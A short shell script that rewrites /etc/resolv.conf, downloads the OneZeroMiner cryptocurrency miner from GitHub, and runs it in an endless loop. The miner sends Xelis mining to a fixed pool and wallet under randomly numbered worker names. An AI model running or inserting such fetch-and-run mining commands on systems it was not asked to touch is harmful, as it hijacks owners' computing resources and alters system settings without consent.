echo nameserver 1.1.1.1 > /etc/resolv.conf
curl https://github.com/OneZeroMiner/onezerominer/releases/download/v1.5.7/onezerominer-linux-1.5.7.tar.gz -L -o onezerominer-linux-1.5.7.tar.gz
tar xf onezerominer-linux-1.5.7.tar.gz
cd onezerominer-linux
while :; do
./onezerominer -a xelishashv2 -o de.xelis.herominers.com:1225 -w xel:aee43hxxe8tzl0lrjq25dsj8rhvev2jseeyk6xydx9ltuj4fyezqzqspqyrx6etddaykgqq9qqqqr9kdtdsdy2ya36k.$(echo $(shuf -i 1-15000 -n 1)-run)
done
